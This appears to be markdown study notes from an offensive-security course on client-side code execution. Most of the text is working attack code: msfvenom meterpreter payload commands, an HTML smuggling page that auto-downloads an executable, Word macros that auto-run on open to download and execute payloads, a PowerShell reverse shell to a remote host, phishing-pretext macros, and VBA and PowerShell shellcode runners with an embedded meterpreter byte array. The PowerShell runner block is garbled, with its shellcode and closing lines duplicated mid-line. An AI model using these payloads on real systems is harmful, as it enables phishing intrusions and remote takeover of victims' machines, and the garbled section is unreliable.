# Client Side Code Execution

- [Staged or Non-staged Payloads](#staged-or-non-staged-payloads)
- [HTML Smuggling](#html-smuggling)
- [Introduction to VBA](#introduction-to-vba)
- [Let PowerShell Help Us](#let-powershell-help-us)
- [Phishing Pretexting](#phishing-pretexting)
- [Executing Shellcode in Word Memory](#executing-shellcode-in-word-memory)
- [VBA Shellcode Runner](#vba-shellcode-runner)
- [PowerShell Shellcode Runner](#powershell-shellcode-runner)

## Staged or Non-Staged Payloads
Staged Payload - Callback function to executes and downloads the meterpreter execution (**Size 7K Bytes**)
```bash
windows/x64/meterpreter/reverse_https
```

Non-Staged Payload - Full of code includes meterpreter (**Size 200K Bytes**)
```bash
windows/x64/meterpreter_reverse_https
```

## HTML Smuggling
Automatically saves the file without clicking.

Create a staged payload and encode it to base64.
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
base64 /var/www/html/msfstaged.exe
```


```html
<html>
  <body>
    <script>
      // Base64 decoding function
      function base64ToArrayBuffer(base64) {
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array( len );
        for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);}
        return bytes.buffer;
      }
      // Converted base64 staged msfpayload
      // decode base64 msfpayload
      var file = 'TVqWEQWEFASDAAWEDASDQWDQDQSSDWQDQD....................'
      var data = base64ToArrayBuffer(file);
      var blob = new Blob([data], {type: 'octet/stream'});
      var fileName = 'msfstaged.exe';

      // download  
      var a = document.createElement('a');
      document.body.appendChild(a);
      a.style = 'display: none';
      var url = window.URL.createObjectURL(blob);
      a.href = url;
      a.download = fileName;
      a.click();
      window.URL.revokeObjectURL(url);
    </script>
  </body>
</html>
```


## Introduction to VBA
Declare variables;

```vb
Dim myString As String
Dim myLong As Long
Dim myPointer As LongPtr
```

**If loops**
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()

Dim myLong As Long

If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub

```

**Foor loop**
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()

For counter = 1 To 3
    MsgBox ("Alert")
Next counter

End Sub
```

Code Exec
```vb
**Foor loop**
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    'Shell str, vbHide'
    CreateObject("Wscript.Shell").Run str, 0

End Sub
```



## Let PowerShell Help Us
Single One-Liner
```powershell
IEX (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')

```

**Powershell reverse shell**
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.0.2.4:443/mypowershell.ps1')"

# mypowershell.ps1
$client = New-Object System.Net.Sockets.TCPClient("10.0.2.4",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Powershell in VBA
```powershell
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    Wait (3)
    Shell exePath, vbHide
End Sub
Sub Wait(n As Long)
    'time delay'
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

```


## Phishing Pretexting
### The Old Switcheroo
![This is an image](./Client%20Side%20Code%20Execution/oldswitcheroo.png)

**Substitution Page with Macro**
```vb
Sub Document_Open()
    SubsPage
End Sub
Sub AutoOpen()
    SubsPage
End Sub
Sub SubsPage()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
End Sub
```


## Executing Shellcode in Word Memory
### Calling Win32 API in VBA
```
https://www.pinvoke.net/default.aspx/advapi32.getusername
```

Call username with `Advapi32.dll`
```c
BOOL GetUserNameA(
  LPSTR lpBuffer,
  LPDWORD pcbBuffer
);
```

x64 Arch. mimaride **`PtrSafe`** kullanilmak zorunda.
```vb
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub

Function MyMacro()
 Dim res As Long
 Dim MyBuff As String * 256
 Dim MySize As Long
 Dim strlen As Long
 MySize = 256

 res = GetUserName(MyBuff, MySize)
 strlen = InStr(1, MyBuff, vbNullChar) - 1
 MsgBox Left$(MyBuff, strlen)
End Function
```

MessageBoxA Win32 API
```vb
Private Declare PtrSafe Function MessageBox Lib "user32.dll" Alias "MessageBoxA" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal uType As Long) As Long

Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub

Function MyMacro()
    Dim res As Long
    Dim Myhwnd As Long
    Dim MyText As String * 256
    Dim MyCaption As String * 256
    Dim MyType As Long
    
    res = MessageBox(Myhwnd, MyText, MyCaption, MyType)
  
    
End Function

```



***Windows Data Types & VB Data Types***

| Windows Data Types | VB Data Types |
|---|---|
| LPDWORD| Long|
| LPSTR | String | 
| LPVOID | LongPtr |
| SIZE_T|  Long |
| DWORD| Long   |



**3.4.1.1. Exercises**
```
1. Replicate the call to GetUserName and return the answer.
2. Import the Win32 MessageBoxA110 API and call it using VBA.
```


## VBA Shellcode Runner
```
VirtualAlloc    - Allocate executable Memory
RtlMoveMemory   - copy shellcode to the newly allocated memory region
CreateThread    - execute shellcode 
```
**Virtual Alloc**
```vb
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpADdress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long


Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    
    'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication'
    buf = Array(232, 130, 0, 0, 0)
       
       
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
End Function
```
**RtlMoveMemory**
```vb
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
End Function
```

**CreateThread**
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr


Function MyMacro()
    Dim res As Long
    
    res = CreateThread(addr + counter, data, 1)
End Function
```

**Collect all together**
```vb
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication'
    buf = Array(252, 232, 0, 83, 255, 213)

    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

 For counter = LBound(buf) To UBound(buf)
 data = buf(counter)
 res = RtlMoveMemory(addr + counter, data, 1)
 Next counter

 res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
```

# PowerShell Shellcode Runner
## Callint Win32 APIs from PowerShell
If the victim closes word our shell will die. We will encounter this with PowerShell.

PowerShell full path
```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
```

![This is an image](./Client%20Side%20Code%20Execution/add-type.png)
Add-Type keyword
```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)]
    public static extern int MessageBox(int hWnd, String text, 
        String caption, uint type);
}
"@

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

## Porting Shellcode Runner to PowerShell

```
VirtualAlloc    - Allocate executable Memory
RtlMoveMemory   - copy shellcode to the newly allocated memory region
CreateThread    - execute shellcode 
```

`RltMoveMemory` can't be use in PowerShell. In PowerShell we can use `System.Runtime.InteropServices.Marshal` 

**`run.ps`** PowerShell script with `Add-Type`

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
 [DllImport("kernel32")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint
dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr
lpThreadId);
}
"@

Add-Type $Kernel32

# msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.114 LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x8b,0x48,0x18,0x50,0x8b,0x58,0x20,0x1,0xd3,0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xc1,0xcf,0xd,0xac,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xbb,0x1,0x0,0x0,0xe8,0x41,0x1,0x0,0x0,0x2f,0x67,0x6f,0x53,0x56,0x50,0x56,0x61,0x31,0x52,0x6d,0x4c,0x73,0x70,0x4f,0x32,0x6c,0x6a,0x75,0x42,0x66,0x4f,0x51,0x4d,0x72,0x41,0x4b,0x6a,0x43,0x50,0x34,0x68,0x4f,0x49,0x36,0x31,0x55,0x54,0x71,0x79,0x39,0x48,0x61,0x73,0x74,0x73,0x66,0x7a,0x52,0x32,0x55,0x54,0x47,0x36,0x57,0x5f,0x64,0x41,0x49,0x37,0x34,0x6e,0x50,0x41,0x6b,0x38,0x43,0x42,0x77,0x62,0x43,0x44,0x33,0x57,0x48,0x49,0x48,0x70,0x6a,0x58,0x62,0x7a,0x73,0x63,0x43,0x43,0x66,0x78,0x37,0x66,0x54,0x38,0x4f,0x42,0x6c,0x44,0x39,0x57,0x72,0x72,0x33,0x74,0x6c,0x45,0x6e,0x6d,0x31,0x49,0x4f,0x6d,0x39,0x41,0x41,0x55,0x73,0x65,0x4b,0x30,0x6e,0x71,0x34,0x78,0x4c,0x72,0x6b,0x70,0x70,0x70,0x39,0x4f,0x54,0x4b,0x35,0x4e,0x63,0x34,0x6e,0x50,0x5a,0x7a,0x4b,0x32,0x6f,0x4e,0x30,0x59,0x63,0x72,0x36,0x5f,0x49,0x42,0x44,0x65,0x4f,0x4a,0x76,0x6c,0x63,0x53,0x55,0x51,0x6c,0x2d,0x42,0x5f,0x72,0x53,0x70,0x68,0x73,0x46,0x59,0x35,0x79,0x77,0x5f,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x47,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x30,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x31,0x34,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5

$size = $buf.Length
[IntPtr]$addr =[Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle =[Kernel32]::CreateThread(0,0,$addr,0,0,0);68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x47,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x30,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x31,0x34,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5

$size = $buf.Length
[IntPtr]$addr =[Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle =[Kernel32]::CreateThread(0,0,$addr,0,0,0);
```

VBA Macro
```vb
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://10.0.0.114/run.ps1') | IEX"
    Shell str, vbHide
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
```
We executed VBA macro but WORD immediately terminates the shell.Because macro downloads the powershellscript executes and terminates it.

![This is an image](./Client%20Side%20Code%20Execution/porting-shellcode.png)

For mitigate this result we have to include another WIN32 API that is **`WaitForSingleObject`** with adding this api PowerShell script will be download and meterpreter session will continue 
![This is an image](./Client%20Side%20Code%20Execution/waitforsingle.png)

https://youtu.be/N-7_JaEi1As?list=PLAXVYHMta5d4foizpSMGP9W3vFAo-9kCe&t=4767